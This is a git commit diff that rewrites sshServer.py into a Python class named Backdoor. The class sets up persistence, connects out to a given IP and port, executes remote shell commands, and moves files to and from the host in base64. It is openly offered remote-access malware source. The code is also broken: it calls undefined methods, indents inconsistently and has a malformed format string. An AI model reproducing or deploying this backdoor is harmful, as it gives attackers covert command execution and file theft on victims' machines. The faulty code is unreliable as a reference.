800b421f4b7ca65d8c170a50ee45e562e67ff9b3
numberx <shekooha696@gmail.com>
2022-01-14 19:34:04 +0330

    TESING VERSION SERVER SIDE

--- sshServer.py
+++ sshServer.py
@@ -1,111 +1,81 @@
 #!/usr/bin/env python3
 import socket
-import paramiko
-import threading
+import subprocess
+import json
+import os
+import base64
 import sys
-import getpass
+import shutil
+
+
+class Backdoor():
+    def __init__(self, ip, port):
+        self.persistence()
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+    def cmd_send(self, data):
+    	"""
+    	Send data in base64 format
+    	"""
+        json_send = json.dumps(data)
+        self.connection.send(json_send)
+
+    def cmd_recv(self):
+        
+    	"""
+    	recive data in base64 format
+    	"""
+        json_recived = ""
+
+        while True:
+            try:
+                json_recived += self.connection.recv(1024)
+                return json.loads(json_recived)
+            except ValueError:
+                continue
+    def change_dir(self, path):
+        """
+        Changes current directory to $path
+        """
+
+        os.chdir(path)
+    
+        return "Changed dir to %s" % path
+    def upload_file(self, path, content):
+    	"""
+    	Uploads file
+    	""" 
+        with open(path, "wb") as file:
+            uploaded_file = base64.b64decode(content)
+            file.write(uploaded_file)
+            return "Uploaded Succesfully !"
+
+    def download_file(self, path):
+        with open(path, "rb") as file:
+            download_file = base64.b64encode(file.read())
+            return download_file
+
+    def exec_command(self, command):
+        return subprocess.check_output(command, shell=True)
 
 
 
+    def run(self):
+        while True:
+            rcvd_cmd = self.reliable_recv()
+            try:
+                if rcvd_cmd[0] == "exit":
+                    self.connection.close()
+                    sys.exit() 
+                elif rcvd_cmd[0] == "cd" and len(rcvd_cmd) > 1:
+                    cmd_rslt = self.change_dir(rcvd_cmd[1])
+                elif rcvd_cmd[0] == "download":
+                    cmd_rslt = self.download_file(rcvd_cmd[1])
+                elif rcvd_cmd[0] == "upload":
+                    cmd_rslt = self.upload_file(rcvd_cmd[1], rcvd_cmd[2])
+                else:
+                    cmd_rslt = self.exec_command(rcvd_cmd)
+            except Exception as e :
+                cmd_rslt = "[-] Error During Command Execution.\n ERROR:\t{e}\t"
 
-
-#TODO: add custom commands
-
-
-#TODO: dynamicly get creds idea : encoders         
-
-
-#TODO: implement client side of ssh
-
-
-# e.g. /home/<username>/.ssh/id_rsa
-
-
-rsa_key = "private rsa key e.g /home/user/.ssh/id_rsa"
-#get credentials 
-username = "root"
-# password = getpass.getpass()
-password = "PASSWORD"
-
-
-key = paramiko.RSAKey(filename=rsa_key)
-
-class Server (paramiko.ServerInterface):
-	def __init__(self, ip):
-		self.event = threading.Event()
-		self.username = username
-		self.password = password
-		self.ip = ip
-		self.credentials = {
-			"username": username,
-			"password": password
-		}
-	
-	def check_request(self, kind, chanid):
-		if self.kind == 'session':
-			return paramiko.OPEN_SUCCEEDED
-		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
-	
-
-	def check_credentials(self, username , password):
-		if self.username == self.credentials["username"] and self.password == self.credentials["password"]:
-
-			return paramiko.AUTH_SUCCESSFUL
-		return paramiko.AUTH_FAILED
-
-	def listener(self, ip):
-		""" starting a listener """
-		try:
-			session = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-			session.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-			session.bind((self.ip, 22))
-			session.listen(100)
-			print ("[*] Listening for connection .....")
-			client , addr = session.accept()
-			print ("[+] Connection Established")
-		except Exception as e:
-			print ("[-] Connection failed: " + str(e))
-
-	def trasport(self):
-		try:
-			client = self.listener.client
-			t = paramiko.Trasport(client)		
-			try:
-				t.load_server_moduli()
-			except:
-				print("[-] failed to load moduli")
-				raise Exception
-			t.add_server_key(key)
-			server = Server()
-			try:
-				t.start_server(server=server)
-			except paramiko.SSHExeption as  x:
-				print ("[-] SSH hadnshake failed" + str(x))
-
-			chan = t.accept(20)
-			print ("[+] Authenticated")
-			print (chan.recv(1024))
-			chan.send('ifconfig')
-
-		except Exception as e:
-			print ("[-] Error occured: " + str(e))
-		try:
-			t.close()
-		except:
-			pass
-			sys.exit(1)
-
-	def run(self):
-		self.check_credentials(self.username,self.password)
-		self.listener(self.ip)
-		self.trasport()
-
-
-
-
-
-
-
-if __name__ == "__main__":
-    server = Server("127.0.0.1")
-    server.run()
+            self.cmd_send(cmd_rslt)
